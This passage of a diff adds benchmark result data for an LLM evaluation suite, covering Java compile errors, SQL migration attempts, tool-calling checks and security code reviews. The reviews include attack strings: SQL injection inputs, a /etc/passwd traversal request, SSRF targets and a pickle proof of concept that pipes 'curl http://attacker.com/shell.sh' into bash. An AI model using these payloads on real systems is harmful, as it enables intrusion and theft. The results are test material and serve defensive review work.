+        "WARNING: sun.misc.Unsafe::staticFieldBase has been called by com.google.inject.internal.aop.HiddenClassDefiner (file:/home/berdachuk/soft/apache-maven-3.9.11/lib/guice-5.1.0-classes.jar)",
+        "WARNING: Please consider reporting this to the maintainers of class com.google.inject.internal.aop.HiddenClassDefiner",
+        "WARNING: sun.misc.Unsafe::staticFieldBase will be removed in a future release",
+        "[ERROR] /home/berdachuk/tmp/qualbench-java-08-retrying-operation-4f8v4vwr/src/main/java/com/qualbench/bugs/RetryingOperation.java:[33,24] incompatible types: java.lang.Exception cannot be converted to java.lang.Error",
+        "[ERROR] /home/berdachuk/tmp/qualbench-java-08-retrying-operation-4f8v4vwr/src/main/java/com/qualbench/bugs/RetryingOperation.java:[34,31] incompatible types: java.lang.Exception cannot be converted to java.lang.Error",
+        "[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.13.0:compile (default-compile) on project java-spring-fixture: Compilation failure: Compilation failure: ",
+        "[ERROR] /home/berdachuk/tmp/qualbench-java-08-retrying-operation-4f8v4vwr/src/main/java/com/qualbench/bugs/RetryingOperation.java:[33,24] incompatible types: java.lang.Exception cannot be converted to java.lang.Error",
+        "[ERROR] /home/berdachuk/tmp/qualbench-java-08-retrying-operation-4f8v4vwr/src/main/java/com/qualbench/bugs/RetryingOperation.java:[34,31] incompatible types: java.lang.Exception cannot be converted to java.lang.Error",
+        "[ERROR] -> [Help 1]",
+        "[ERROR] ",
+        "[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.",
+        "[ERROR] Re-run Maven using the -X switch to enable full debug logging.",
+        "[ERROR] ",
+        "[ERROR] For more information about the errors and possible solutions, please read the following articles:",
+        "[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException",
+        "Picked up JAVA_TOOL_OPTIONS: -Xms1024m -Xmx8192m",
+        "Picked up _JAVA_OPTIONS: -Xms1024m -Xmx8192m",
+        "WARNING: A terminally deprecated method in sun.misc.Unsafe has been called",
+        "WARNING: sun.misc.Unsafe::staticFieldBase has been called by com.google.inject.internal.aop.HiddenClassDefiner (file:/home/berdachuk/soft/apache-maven-3.9.11/lib/guice-5.1.0-classes.jar)",
+        "WARNING: Please consider reporting this to the maintainers of class com.google.inject.internal.aop.HiddenClassDefiner",
+        "WARNING: sun.misc.Unsafe::staticFieldBase will be removed in a future release"
+      ]
+    },
+    {
+      "category": "ts-angular",
+      "n_pass": 0,
+      "n_total": 0,
+      "wall_s": 4.7581799030303955,
+      "returncode": 1,
+      "timed_out": false,
+      "tasks": [],
+      "artifact_count": 0,
+      "logs": []
+    },
+    {
+      "category": "sql-migrations",
+      "n_pass": 4,
+      "n_total": 6,
+      "wall_s": 16.239765882492065,
+      "returncode": 1,
+      "timed_out": false,
+      "tasks": [
+        {
+          "id": "01-add-column-not-null",
+          "passed": true,
+          "elapsed_s": 1.2,
+          "reasons": [],
+          "artifact": {
+            "task_id": "01-add-column-not-null",
+            "category": "sql-migrations",
+            "task_dir": "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/01-add-column-not-null",
+            "response_length": 89,
+            "response_excerpt": "```sql\nALTER TABLE orders ADD COLUMN shipping_status TEXT NOT NULL DEFAULT 'pending';\n```",
+            "candidate_sql": "ALTER TABLE orders ADD COLUMN shipping_status TEXT NOT NULL DEFAULT 'pending';\n",
+            "candidate_length": 79,
+            "verifier": {
+              "command": [
+                "bash",
+                "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/verify.sh",
+                "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/01-add-column-not-null",
+                "up.candidate.sql"
+              ],
+              "returncode": 0
+            }
+          }
+        },
+        {
+          "id": "02-unique-constraint-dupes",
+          "passed": false,
+          "elapsed_s": 2.0,
+          "reasons": [
+            "verify.sh failed (exit 1):",
+            "== Task: /home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/02-unique-constraint-dupes =="
+          ],
+          "artifact": {
+            "task_id": "02-unique-constraint-dupes",
+            "category": "sql-migrations",
+            "task_dir": "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/02-unique-constraint-dupes",
+            "response_length": 165,
+            "response_excerpt": "```sql\nDELETE FROM users \nWHERE id IN (\n    SELECT MIN(id)\n    FROM users\n    GROUP BY email\n);\n\nALTER TABLE users ADD CONSTRAINT users_email_key UNIQUE (email);\n```",
+            "candidate_sql": "DELETE FROM users \nWHERE id IN (\n    SELECT MIN(id)\n    FROM users\n    GROUP BY email\n);\n\nALTER TABLE users ADD CONSTRAINT users_email_key UNIQUE (email);\n",
+            "candidate_length": 155,
+            "verifier": {
+              "command": [
+                "bash",
+                "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/verify.sh",
+                "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/02-unique-constraint-dupes",
+                "up.candidate.sql"
+              ],
+              "returncode": 1,
+              "output_tail": "== Task: /home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/02-unique-constraint-dupes ==\n== Migration file: up.candidate.sql ==\nCREATE DATABASE\n-- Applying seed.sql --\nCREATE TABLE\nINSERT 0 4\n-- Applying up.candidate.sql (dry-run of the migration under test) --\nDELETE 3\nALTER TABLE\n-- Running check.sql --\nFAIL: check.sql itself errored\npsql:/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/02-unique-constraint-dupes/check.sql:25: ERROR:  expected unique_violation but insert succeeded\nCONTEXT:  PL/pgSQL function inline_code_block line 5 at RAISE"
+            }
+          }
+        },
+        {
+          "id": "03-rename-column-view",
+          "passed": false,
+          "elapsed_s": 1.8,
+          "reasons": [
+            "verify.sh failed (exit 1):",
+            "== Task: /home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/03-rename-column-view =="
+          ],
+          "artifact": {
+            "task_id": "03-rename-column-view",
+            "category": "sql-migrations",
+            "task_dir": "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/03-rename-column-view",
+            "response_length": 171,
+            "response_excerpt": "```sql\nALTER TABLE products ADD COLUMN quantity_in_stock INTEGER NOT NULL DEFAULT 0;\nUPDATE products SET quantity_in_stock = qty;\nALTER TABLE products DROP COLUMN qty;\n```",
+            "candidate_sql": "ALTER TABLE products ADD COLUMN quantity_in_stock INTEGER NOT NULL DEFAULT 0;\nUPDATE products SET quantity_in_stock = qty;\nALTER TABLE products DROP COLUMN qty;\n",
+            "candidate_length": 161,
+            "verifier": {
+              "command": [
+                "bash",
+                "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/verify.sh",
+                "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/03-rename-column-view",
+                "up.candidate.sql"
+              ],
+              "returncode": 1,
+              "output_tail": "== Task: /home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/03-rename-column-view ==\n== Migration file: up.candidate.sql ==\nCREATE DATABASE\n-- Applying seed.sql --\nCREATE TABLE\nINSERT 0 3\nCREATE VIEW\n-- Applying up.candidate.sql (dry-run of the migration under test) --\nALTER TABLE\nUPDATE 3\nFAIL: up.candidate.sql did not apply cleanly\npsql:/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/03-rename-column-view/up.candidate.sql:3: ERROR:  cannot drop column qty of table products because other objects depend on it\nDETAIL:  view low_stock_products depends on column qty of table products\nHINT:  Use DROP ... CASCADE to drop the dependent objects too."
+            }
+          }
+        },
+        {
+          "id": "04-non-idempotent-migration",
+          "passed": true,
+          "elapsed_s": 3.8,
+          "reasons": [],
+          "artifact": {
+            "task_id": "04-non-idempotent-migration",
+            "category": "sql-migrations",
+            "task_dir": "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/04-non-idempotent-migration",
+            "response_length": 383,
+            "response_excerpt": "```sql\nALTER TABLE accounts ADD COLUMN IF NOT EXISTS is_active BOOLEAN NOT NULL DEFAULT true;\n\nCREATE INDEX IF NOT EXISTS idx_accounts_is_active ON accounts (is_active);\n\nCREATE TABLE IF NOT EXISTS account_tiers (\n    name TEXT PRIMARY KEY\n);\n\nINSERT INTO account_tiers (name) \nSELECT name FROM (VALUES ('free'), ('pro'), ('enterprise')) AS t(name)\nON CONFLICT (name) DO NOTHING;\n```",
+            "candidate_sql": "ALTER TABLE accounts ADD COLUMN IF NOT EXISTS is_active BOOLEAN NOT NULL DEFAULT true;\n\nCREATE INDEX IF NOT EXISTS idx_accounts_is_active ON accounts (is_active);\n\nCREATE TABLE IF NOT EXISTS account_tiers (\n    name TEXT PRIMARY KEY\n);\n\nINSERT INTO account_tiers (name) \nSELECT name FROM (VALUES ('free'), ('pro'), ('enterprise')) AS t(name)\nON CONFLICT (name) DO NOTHING;\n",
+            "candidate_length": 373,
+            "verifier": {
+              "command": [
+                "bash",
+                "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/verify.sh",
+                "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/04-non-idempotent-migration",
+                "up.candidate.sql"
+              ],
+              "returncode": 0
+            }
+          }
+        },
+        {
+          "id": "05-fk-missing-unique-target",
+          "passed": true,
+          "elapsed_s": 5.8,
+          "reasons": [],
+          "artifact": {
+            "task_id": "05-fk-missing-unique-target",
+            "category": "sql-migrations",
+            "task_dir": "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/05-fk-missing-unique-target",
+            "response_length": 751,
+            "response_excerpt": "```sql\n-- Add the column as nullable first to allow existing rows to exist\nALTER TABLE shipments ADD COLUMN warehouse_code TEXT;\n\n-- Add a unique constraint to the parent table to ensure the FK is valid\n-- and to enforce the \"unique business code\" intent mentioned in the context.\nALTER TABLE warehouses ADD CONSTRAINT unique_warehouse_code UNIQUE (code);\n\n-- Add the foreign key constraint\nALTER TABLE shipments\n    ADD CONSTRAINT fk_shipments_warehouse_code\n    FOREIGN KEY (warehouse_code) REFERENCES warehouses (code);\n\n-- Optional: If the intent is to ensure every shipment MUST have a warehouse,\n-- you would add a NOT NULL constraint here after ensuring data is backfilled.\n-- ALTER TABLE shipments ALTER COLUMN warehouse_code SET NOT NULL;\n```",
+            "candidate_sql": "-- Add the column as nullable first to allow existing rows to exist\nALTER TABLE shipments ADD COLUMN warehouse_code TEXT;\n\n-- Add a unique constraint to the parent table to ensure the FK is valid\n-- and to enforce the \"unique business code\" intent mentioned in the context.\nALTER TABLE warehouses ADD CONSTRAINT unique_warehouse_code UNIQUE (code);\n\n-- Add the foreign key constraint\nALTER TABLE shipments\n    ADD CONSTRAINT fk_shipments_warehouse_code\n    FOREIGN KEY (warehouse_code) REFERENCES warehouses (code);\n\n-- Optional: If the intent is to ensure every shipment MUST have a warehouse,\n-- you would add a NOT NULL constraint here after ensuring data is backfilled.\n-- ALTER TABLE shipments ALTER COLUMN warehouse_code SET NOT NULL;\n",
+            "candidate_length": 741,
+            "verifier": {
+              "command": [
+                "bash",
+                "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/verify.sh",
+                "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/05-fk-missing-unique-target",
+                "up.candidate.sql"
+              ],
+              "returncode": 0
+            }
+          }
+        },
+        {
+          "id": "06-bad-backfill-update",
+          "passed": true,
+          "elapsed_s": 1.7,
+          "reasons": [],
+          "artifact": {
+            "task_id": "06-bad-backfill-update",
+            "category": "sql-migrations",
+            "task_dir": "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/06-bad-backfill-update",
+            "response_length": 140,
+            "response_excerpt": "```sql\nUPDATE orders\nSET discount_percent = discount_codes.percent\nFROM discount_codes\nWHERE orders.discount_code = discount_codes.code;\n```",
+            "candidate_sql": "UPDATE orders\nSET discount_percent = discount_codes.percent\nFROM discount_codes\nWHERE orders.discount_code = discount_codes.code;\n",
+            "candidate_length": 130,
+            "verifier": {
+              "command": [
+                "bash",
+                "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/verify.sh",
+                "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/06-bad-backfill-update",
+                "up.candidate.sql"
+              ],
+              "returncode": 0
+            }
+          }
+        }
+      ],
+      "artifact_count": 6,
+      "logs": [
+        "== Migration file: up.candidate.sql ==",
+        "CREATE DATABASE",
+        "-- Applying seed.sql --",
+        "CREATE TABLE",
+        "INSERT 0 4",
+        "-- Applying up.candidate.sql (dry-run of the migration under test) --",
+        "DELETE 3",
+        "ALTER TABLE",
+        "-- Running check.sql --",
+        "FAIL: check.sql itself errored",
+        "psql:/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/02-unique-constraint-dupes/check.sql:25: ERROR:  expected unique_violation but insert succeeded",
+        "CONTEXT:  PL/pgSQL function inline_code_block line 5 at RAISE",
+        "== Migration file: up.candidate.sql ==",
+        "CREATE DATABASE",
+        "-- Applying seed.sql --",
+        "CREATE TABLE",
+        "INSERT 0 3",
+        "CREATE VIEW",
+        "-- Applying up.candidate.sql (dry-run of the migration under test) --",
+        "ALTER TABLE",
+        "UPDATE 3",
+        "FAIL: up.candidate.sql did not apply cleanly",
+        "psql:/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/03-rename-column-view/up.candidate.sql:3: ERROR:  cannot drop column qty of table products because other objects depend on it",
+        "DETAIL:  view low_stock_products depends on column qty of table products",
+        "HINT:  Use DROP ... CASCADE to drop the dependent objects too."
+      ]
+    },
+    {
+      "category": "mcp-tools",
+      "n_pass": 8,
+      "n_total": 8,
+      "wall_s": 10.406110525131226,
+      "returncode": 0,
+      "timed_out": false,
+      "tasks": [
+        {
+          "id": "01-single-tool-required-args",
+          "passed": true,
+          "elapsed_s": 0.8,
+          "reasons": [],
+          "artifact": {
+            "task_id": "01-single-tool-required-args",
+            "category": "mcp-tools",
+            "finish_reason": "tool_calls",
+            "tool_call_count": 1,
+            "tool_call_names": [
+              "get_weather"
+            ]
+          }
+        },
+        {
+          "id": "02-enum-selection",
+          "passed": true,
+          "elapsed_s": 0.9,
+          "reasons": [],
+          "artifact": {
+            "task_id": "02-enum-selection",
+            "category": "mcp-tools",
+            "finish_reason": "tool_calls",
+            "tool_call_count": 1,
+            "tool_call_names": [
+              "create_ticket"
+            ]
+          }
+        },
+        {
+          "id": "03-numeric-coercion",
+          "passed": true,
+          "elapsed_s": 1.0,
+          "reasons": [],
+          "artifact": {
+            "task_id": "03-numeric-coercion",
+            "category": "mcp-tools",
+            "finish_reason": "tool_calls",
+            "tool_call_count": 1,
+            "tool_call_names": [
+              "apply_discount"
+            ]
+          }
+        },
+        {
+          "id": "04-nested-object-args",
+          "passed": true,
+          "elapsed_s": 2.0,
+          "reasons": [],
+          "artifact": {
+            "task_id": "04-nested-object-args",
+            "category": "mcp-tools",
+            "finish_reason": "tool_calls",
+            "tool_call_count": 1,
+            "tool_call_names": [
+              "create_shipping_label"
+            ]
+          }
+        },
+        {
+          "id": "05-tool-disambiguation",
+          "passed": true,
+          "elapsed_s": 1.6,
+          "reasons": [],
+          "artifact": {
+            "task_id": "05-tool-disambiguation",
+            "category": "mcp-tools",
+            "finish_reason": "tool_calls",
+            "tool_call_count": 1,
+            "tool_call_names": [
+              "create_calendar_event"
+            ]
+          }
+        },
+        {
+          "id": "06-missing-info-no-premature-call",
+          "passed": true,
+          "elapsed_s": 0.9,
+          "reasons": [],
+          "artifact": {
+            "task_id": "06-missing-info-no-premature-call",
+            "category": "mcp-tools",
+            "finish_reason": "stop",
+            "tool_call_count": 0,
+            "tool_call_names": [],
+            "response_excerpt": "I'd be happy to help you send that money to Jake. Could you please provide Jake's account ID?"
+          }
+        },
+        {
+          "id": "07-multi-step-context-carry",
+          "passed": true,
+          "elapsed_s": 1.3,
+          "reasons": [],
+          "artifact": {
+            "task_id": "07-multi-step-context-carry",
+            "category": "mcp-tools",
+            "finish_reason": "tool_calls",
+            "tool_call_count": 1,
+            "tool_call_names": [
+              "issue_refund"
+            ]
+          }
+        },
+        {
+          "id": "08-array-argument",
+          "passed": true,
+          "elapsed_s": 1.8,
+          "reasons": [],
+          "artifact": {
+            "task_id": "08-array-argument",
+            "category": "mcp-tools",
+            "finish_reason": "tool_calls",
+            "tool_call_count": 1,
+            "tool_call_names": [
+              "invite_to_meeting"
+            ]
+          }
+        }
+      ],
+      "artifact_count": 8,
+      "logs": []
+    },
+    {
+      "category": "security-review",
+      "n_pass": 8,
+      "n_total": 8,
+      "wall_s": 304.28992438316345,
+      "returncode": 0,
+      "timed_out": false,
+      "tasks": [
+        {
+          "id": "01-sql-injection",
+          "passed": true,
+          "elapsed_s": 27.2,
+          "reasons": [],
+          "artifact": {
+            "task_id": "01-sql-injection",
+            "category": "security-review",
+            "response_length": 3537,
+            "response_excerpt": "As an application security reviewer, I have analyzed the provided Java/JDBC code. This snippet contains a **critical** security vulnerability that would allow an attacker to take full control of your database.\n\n### 1. Critical Vulnerability: SQL Injection (SQLi)\nThe most severe issue is the construction of the SQL query using **string concatenation**.\n\n*   **The Flaw:** The code takes the `username` input directly from a method parameter and appends it into the SQL string: `... WHERE username = '\" + username + \"'\"`.\n*   **The Impact:** An attacker can provide a specially crafted string as the `username` to alter the logic of the SQL command.\n    *   **Authentication Bypass:** If an attacker enters `' OR '1'='1`, the query becomes:\n        `SELECT * FROM users WHERE username = '' OR '1'='1'`\n        This would return the first user in the database (often the admin), allowing the attacker to log in without a password.\n    *   **Data Exfiltration:** An attacker could use `UNION SELECT` statements to dump the entire contents of other tables (e.g., `'; SELECT * FROM passwords --`).\n    *   **Destructive Actions:** Depending on database permissions, an attacker could inject commands like `; DROP TABLE users; --`.\n\n---\n\n### 2. Secondary Issue: Information Exposure (Select *)\nThe query uses `SELECT *`.\n\n*   **The Flaw:** While not a direct \"exploit,\" using `*` is a poor security practice.\n*   **The Impact:** If the `users` table is updated in the future to include sensitive fields (like `password_hash`, `session_tokens`, or `secret_questions`), the `ResultSet` will contain that data. If the `User` object is later serialized or logged, you risk leaking sensitive data that wasn't intended to be part of the \"User\" profile.\n\n---\n\n### Recommended Fixes\n\n#### The Primary Fix: Use `PreparedStatement`\nYou must use a `PreparedStatement`. This ensures that the database treats the input as **data**, not as **executable code**. The JDBC driver handles the escaping of characters automat... [truncated]"
+          }
+        },
+        {
+          "id": "02-hardcoded-secret",
+          "passed": true,
+          "elapsed_s": 45.3,
+          "reasons": [],
+          "artifact": {
+            "task_id": "02-hardcoded-secret",
+            "category": "security-review",
+            "response_length": 5345,
+            "response_excerpt": "As an application security reviewer, I have analyzed the provided Python snippet. While the code is functional, it contains several critical security flaws and architectural weaknesses that would be flagged during a professional security audit.\n\nHere is the breakdown of the vulnerabilities and the recommended remediations.\n\n---\n\n### 1. Hardcoded Sensitive Credentials (Critical)\n**Vulnerability:** The `STRIPE_API_KEY` is hardcoded directly into the source code.\n**Risk:** If this code is committed to a version control system (like GitHub or GitLab), anyone with access to the repository can steal the key. Even if the key is \"redacted\" in the snippet provided, the practice of keeping secrets in code leads to \"Secret Leakage.\" An attacker with this key can perform unauthorized transactions, access customer data, and disrupt your financial operations.\n**Fix:** Use **Environment Variables** or a **Secret Management Service** (like AWS Secrets Manager, Hash5, or HashiCorp Vault).\n\n*   **Remediation:**\n    ```python\n    import os\n    # Fetch from environment variable\n    STRIPE_API_KEY = os.environ.get(\"STRIPE_SECRET_KEY\")\n    ```\n\n### 2. Lack of Input Validation (High)\n**Vulnerability:** The function accepts `customer_id` and `amount_cents` directly from the caller without any validation.\n**Risk:** \n*   **Negative Amounts:** An attacker could pass a negative integer for `amount_cents`, potentially resulting in a refund or a balance adjustment depending on how the API handles it.\n*   **Injection/Malformed Data:** While `requests` handles some encoding, passing unvalidated strings into API calls can lead to unexpected behavior or errors in downstream processing.\n**Fix:** Implement strict type checking and range validation.\n\n*   **Remediation:**\n    ```python\n    if not isinstance(amount_cents, int) or amount_cents <= 0:\n        raise ValueError(\"Amount must be a positive integer.\")\n    if not customer_id or not customer_id.isalnum(): # Example check\n        raise ValueError(\"... [truncated]"
+          }
+        },
+        {
+          "id": "03-path-traversal",
+          "passed": true,
+          "elapsed_s": 37.5,
+          "reasons": [],
+          "artifact": {
+            "task_id": "03-path-traversal",
+            "category": "security-review",
+            "response_length": 4444,
+            "response_excerpt": "As an application security reviewer, I have analyzed your code. This snippet contains a **Critical** security vulnerability that would allow an attacker to take full control of your server or steal sensitive data.\n\nHere is the breakdown of the vulnerabilities and the required remediation steps.\n\n---\n\n### 1. Path Traversal (Directory Traversal)\n**Severity: Critical**\n\n**Description:**\nThe application takes the `file` parameter directly from the user query string and joins it with a base directory using `path.join()`. Because there is no validation or sanitization on the `filename` variable, an attacker can use \"dot-dot-slash\" (`../`) sequences to escape the intended `/var/app/uploads` directory.\n\n**Attack Scenario:**\nAn attacker could send a request to:\n`GET /download?file=../../../../etc/passwd`\n\nThe `path.join` function will resolve this to `/etc/passwd`. The server will then read and return the system's password file to the attacker. This can be used to steal configuration files, environment variables (containing API keys), or source code.\n\n**How to Fix:**\n1.  **Sanitize the filename:** Strip out any path information.\n2.  **Validate the path:** Ensure the resolved path actually starts with the intended directory.\n3.  **Use a whitelist:** If possible, only allow specific filenames.\n\n---\n\n### 2. Denial of Service (DoS) via Memory Exhaustion\n**Severity: High**\n\n**Description:**\nYou are using `fs.readFile()` to serve files. `fs.readFile` loads the **entire contents** of the file into the server's RAM before sending it to the client.\n\n**Attack Scenario:**\nIf a user requests a very large file (e.g., a 4GB video file), the Node.js process will attempt to allocate 4GB of memory. If multiple users do this simultaneously, the server will run out of memory and crash (OOM - Out of Memory).\n\n**How to Fix:**\nUse **Streams**. Streams read the file in small chunks and pipe them directly to the response, keeping memory usage constant regardless of file size.\n\n---\n\n### 3. Informati... [truncated]"
+          }
+        },
+        {
+          "id": "04-insecure-deserialization",
+          "passed": true,
+          "elapsed_s": 35.6,
+          "reasons": [],
+          "artifact": {
+            "task_id": "04-insecure-deserialization",
+            "category": "security-review",
+            "response_length": 4208,
+            "response_excerpt": "As an application security reviewer, I have analyzed the provided Flask code. This code contains a **Critical** severity vulnerability that allows for **Remote Code Execution (RCE)**.\n\nBelow is the detailed security assessment.\n\n---\n\n### 1. Critical Vulnerability: Insecure Deserialization\n**Severity:** Critical\n**CWE:** [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)\n\n#### Description:\nThe application uses the Python `pickle` module to deserialize data provided directly by the user via the `state` form parameter. \n\nThe `pickle` module is **not secure** against erroneous or maliciously constructed data. When `pickle.loads()` is called on untrusted input, an attacker can craft a \"pickle bomb\"\u2014a base64-encoded payload that, when deserialized, executes arbitrary system commands on the server. This is because `pickle` can be instructed to execute arbitrary functions (via the `__reduce__` method) during the reconstruction of an object.\n\n#### Impact:\nAn attacker can gain full control over the server. They can:\n*   Execute shell commands (e.g., `rm -rf /`, `ls`, `whoami`).\n*   Install malware or backdoors.\n*   Exfiltrate environment variables (including database credentials and API keys).\n*   Pivot into the internal network.\n\n#### Proof of Concept (Conceptual):\nAn attacker could generate a payload using a simple script:\n```python\nimport pickle\nimport base64\nimport os\n\nclass RCE:\n    def __reduce__(self):\n        # This command will run on the server when pickle.loads() is called\n        return (os.system, ('curl http://attacker.com/shell.sh | bash',))\n\npayload = base64.b64encode(pickle.dumps(RCE()))\nprint(payload)\n```\nIf the attacker sends this string as the `state` parameter, the server will execute the curl command immediately.\n\n---\n\n### 2. Secondary Issue: Lack of Input Validation\n**Severity:** Low/Medium\n**CWE:** [CWE-20: Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)\n\n#### Description:\nThe code d... [truncated]"
+          }
+        },
+        {
+          "id": "05-weak-crypto-hash",
+          "passed": true,
+          "elapsed_s": 32.3,
+          "reasons": [],
+          "artifact": {
+            "task_id": "05-weak-crypto-hash",
+            "category": "security-review",
+            "response_length": 4294,
+            "response_excerpt": "As an application security reviewer, I have analyzed the provided `UserRegistrationService` code. This snippet contains several critical security flaws that would make the application highly vulnerable to credential theft and account takeover.\n\nHere is the breakdown of the vulnerabilities and the recommended remediation steps.\n\n---\n\n### 1. Use of a Broken Cryptographic Hash Function (MD5)\n**Vulnerability:** The code uses **MD5** to hash passwords.\n**Risk:** MD5 is cryptographically broken. It is susceptible to collision attacks and, more importantly, it is extremely fast. Modern hardware (GPUs/ASICs) can compute billions of MD5 hashes per second, making it trivial for an attacker to crack passwords using \"Rainbow Tables\" or brute-force attacks.\n**Impact:** High. An attacker who gains access to the database can quickly recover the original plain-text passwords of almost all users.\n\n### 2. Lack of \"Salt\" (Deterministic Hashing)\n**Vulnerability:** The code hashes the password directly without a unique, random \"salt.\"\n**Risk:** Without a salt, two users with the same password (e.g., \"Password123\") will have the exact same hash in the database. This allows attackers to use pre-computed tables to crack entire batches of users simultaneously.\n**Impact:** High. It facilitates large-scale credential cracking.\n\n### 3. Lack of Key Stretching (Work Factor)\n**Vulnerability:** The code uses a single-pass hash function.\n**Risk:** Secure password storage requires \"Key Stretching\"\u2014a process that intentionally slows down the hashing algorithm (e.g., running it 100,000+ times). Because MD5 is designed for speed, it provides zero protection against modern brute-force hardware.\n**Impact:** High.\n\n### 4. Character Encoding Issues\n**Vulnerability:** `plainPassword.getBytes()` uses the platform's default charset.\n**Risk:** If the application is deployed on different operating systems (e.g., Windows vs. Linux), the same password might result in different byte arrays and, consequently, diffe... [truncated]"
+          }
+        },
+        {
+          "id": "06-ssrf",
+          "passed": true,
+          "elapsed_s": 46.2,
+          "reasons": [],
+          "artifact": {
+            "task_id": "06-ssrf",
+            "category": "security-review",
+            "response_length": 5381,
+            "response_excerpt": "As an application security reviewer, I have analyzed the provided Flask code. This snippet contains several critical security vulnerabilities that could lead to full server compromise, internal network exposure, and Denial of Service (DoS).\n\nHere is the breakdown of the vulnerabilities and the recommended remediations.\n\n---\n\n### 1. Server-Side Request Forgery (SSRF)\n**Severity: Critical**\n\n**Description:**\nThe application takes a user-provided URL (`request.args.get('url')`) and makes a server-side request to it using `requests.get()`. An attacker can provide internal IP addresses (e.g., `http://127.0.0.1:8080`, `http://192.168.1.1`, or `http://169.254.169.254` for cloud metadata) to scan your internal network, access private databases, or steal cloud credentials.\n\n**How to fix:**\n*   **Allowlisting:** Only allow requests to specific, trusted domains.\n*   **IP Validation:** Resolve the domain to an IP address and block requests to private, loopback, or reserved IP ranges.\n*   **Network Isolation:** Run the service in a restricted network segment (DMZ) with no access to the internal network.\n\n### 2. Lack of Input Validation (Protocol Smuggling)\n**Severity: High**\n\n**Description:**\nThe code does not validate the protocol of the URL. An attacker could provide protocols other than `http` or `https`, such as `file:///etc/passwd`, `gopher://`, or `ftp://`. Depending on the underlying library configuration, this could lead to local file disclosure or interaction with other services.\n\n**How to fix:**\n*   Strictly validate that the URL starts with `https://`.\n*   Use a library like `urllib.parse` to decompose the URL and verify the scheme and netloc before making the request.\n\n### 3. Denial of Service (DoS) - Resource Exhaustion\n**Severity: Medium**\n\n**Description:**\nWhile there is a `timeout=5`, the code does not limit the **size** of the response body before it is loaded into memory. If an attacker points the URL to a \"decompression bomb\" or a multi-gigabyte file, `resp.te... [truncated]"
+          }
+        },
+        {
+          "id": "07-broken-access-control",
+          "passed": true,
+          "elapsed_s": 29.0,
+          "reasons": [],
+          "artifact": {
+            "task_id": "07-broken-access-control",
+            "category": "security-review",
+            "response_length": 3869,
+            "response_excerpt": "As an application security reviewer, I have analyzed the provided code. While you mentioned that the endpoint is protected by a general authentication layer (verifying *who* the user is), the code suffers from a critical authorization flaw.\n\nHere is the security assessment:\n\n### 1. Broken Object Level Authorization (BOLA) / IDOR\n**Severity: Critical**\n\n**Description:**\nThis is the most significant vulnerability in the snippet. While the system confirms that a user is logged in, it fails to verify if the logged-in user has the **permission** to view the specific `invoiceId` requested. \n\nAn attacker can perform an **Insecure Direct Object Reference (IDOR)** attack by simply changing the `invoiceId` in the URL (e.g., changing `/api/invoices/100` to `/api/invoices/101`). If the ID exists in the database, the system will return the data, even if that invoice belongs to a different customer.\n\n**Impact:**\nUnauthorized data disclosure. Any authenticated user can scrape the entire database of invoices belonging to every other user in the system.\n\n**How to Fix:**\nYou must implement an ownership check. The query should filter by both the `invoiceId` and the `userId` (or `organizationId`) associated with the currently authenticated session.\n\n*   **Recommended Code Change:**\n    ```java\n    @GetMapping(\"/{invoiceId}\")\n    public ResponseEntity<Invoice> getInvoice(@PathVariable Long invoiceId, PrincipalPrincipal principal) {\n        // Extract the current user's ID from the security context\n        Long currentUserId = principal.getUserId(); \n\n        // Query the repository using BOTH the ID and the Owner ID\n        Invoice invoice = invoiceRepository.findByIdAndUserId(invoiceId, currentUserId)\n                .orElseThrow(() -> new ResponseStatusException(HttpStatus.NOT_FOUND));\n        \n        return ResponseEntity.ok(invoice);\n    }\n    ```\n\n---\n\n### 2. Information Exposure via Error Messages\n**Severity: Low/Medium**\n\n**Description:**\nThe code uses `HttpStatus.NOT_FOUND` for... [truncated]"
+          }
+        },
+        {
+          "id": "08-command-injection",
+          "passed": true,
+          "elapsed_s": 51.1,
+          "reasons": [],
+          "artifact": {
+            "task_id": "08-command-injection",
+            "category": "security-review",
+            "response_length": 5843,
